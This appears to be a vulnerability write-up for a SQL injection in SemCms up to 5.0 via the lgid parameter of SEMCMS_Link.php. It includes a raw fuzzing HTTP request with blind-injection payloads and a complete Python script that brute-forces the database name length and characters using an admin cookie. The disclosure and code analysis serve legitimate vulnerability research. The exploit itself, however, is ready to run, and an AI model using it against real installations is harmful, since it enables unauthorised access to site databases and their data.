# SemCms <= 5.0 has a SQL Injection Vulnerability
##### Vulnerability Location: SEMCMS_Link.php
##### Affected Range: SemCms <= 5.0
##### Vulnerability Cause: SemCms <= v5.0 was discovered to contain a SQL injection vulnerability.This allows an attacker to execute arbitrary code via the lgid parameter in the SEMCMS_Link.php component.
##### Vulnerability Impact: Obtain database access rights, and even DBA permissions.
##### Link:https://www.sem-cms.com/

# Vulnerability recurrence

After entering the background.Hole source location: SEMCMS_Link. PHP, lgid parameters also have SQL injection vulnerabilities URL: http://localhost:83/admin/SEMCMS_Link.php?lgid=1

![image](https://github.com/user-attachments/assets/4dd0d0fb-f8df-45d9-a0c9-b15309a6d1f5)

When lgid=2, there is no corresponding content!

![image](https://github.com/user-attachments/assets/f1710e41-30f0-4664-b97e-4ed9ed35e1c5)

Determine the length of the database:

![image](https://github.com/user-attachments/assets/3fc42bb0-80dd-413f-916a-2957c10538a1)
![image](https://github.com/user-attachments/assets/3470826c-4410-4db2-8ddb-d2f66d4482c7)

From the above figure, it can be obtained that the length of the database name is 8. Next, determine the specific value of the database name:

![image](https://github.com/user-attachments/assets/60e2119f-ef53-4180-8d68-6e3dea12cc1e)

Finally, the database username is obtained as semcms50, and the yakit data packet:

```
GET /admin/SEMCMS_Link.php?lgid=if(substr(database(),{{int(1-8)}},1)+like+"{{payload(word)}}",1,2) HTTP/1.1
Host: localhost:83
sec-ch-ua-platform: "Windows"
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Cookie: scusername=%E6%80%BB%E8%B4%A6%E5%8F%B7; scuseradmin=Admin; scuserpass=c4ca4238a0b923820dcc509a6f75849b
sec-ch-ua: "Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"
Accept-Encoding: gzip, deflate, br, zstd
Sec-Fetch-User: ?1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Upgrade-Insecure-Requests: 1
Accept-Language: zh-CN,zh;q=0.9
sec-ch-ua-mobile: ?0
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
```
# Code Analysis
Line 71 of `SEMCMS_Link.php`

![image](https://github.com/user-attachments/assets/1e4e649e-d942-4825-9a8b-c467a59785fa)

The lgid parameters were directly concatenated into the SQL statement, thereby causing an SQL injection vulnerability

# Vulnerability exploitation script
```
import requests
import string
import time
from urllib.parse import parse_qs, urlencode
# 需要通过页面的回显来修改判断的条件
# 需要后台路径
# 需要更新Cookie

# 发送请求
def send_request(url, headers):
    try:
        response = requests.get(
            url,
            headers=headers,
            timeout=10,
            verify=False
        )

        return response
    except Exception as e:
        print(f"请求失败: {e}")
        return None


# 爆破数据库名长度
def database_length():
    print("[*] 开始爆破数据库名长度...")
    for i in range(1,20):
        base_url = url + f'if(length(database())>{i},2,1)'
        resp = send_request(base_url,header).text
        if 'semcms' in resp:
            print("数据库名长度为：" + str(i))
            return i 
            

# 爆破数据库名
def exploit_sql_injection(url, header, db_len):
    
    
    db_name = ""
    
    max_length = 32  # 假设数据库名最大长度
    
    # 字符集：小写字母、数字、常见符号
    charset = string.ascii_lowercase + string.digits + "-$@! "
    

    print("[*] 开始爆破数据库名...")

    for i in range(1,db_len+1):
        for j in charset:
            base_url = url + f'if(substr(database(),{i},1) like "{j}",1,2)'
            resp = send_request(base_url, header).text
            if 'semcms' in resp:
                db_name += str(j)
                print(f"[+] 第{i}个位置的字符: '{j}' 匹配成功, 当前: {db_name}")
                break

    
    print(f"[*] 爆破完成! 数据库名: {db_name}")
    return db_name

if __name__ == "__main__":
    url = f"http://192.168.124.6:81/VvK4qw_Admin/SEMCMS_Link.php?lgid="
    
    db_len = 0

    header = {
        "Cookie":"scusername=%E6%80%BB%E8%B4%A6%E5%8F%B7; scuseradmin=Admin; scuserpass=c4ca4238a0b923820dcc509a6f75849b"
    }

    db_len = database_length()

    if(db_len != 0):
        exploit_sql_injection(url, header,db_len)
    

```
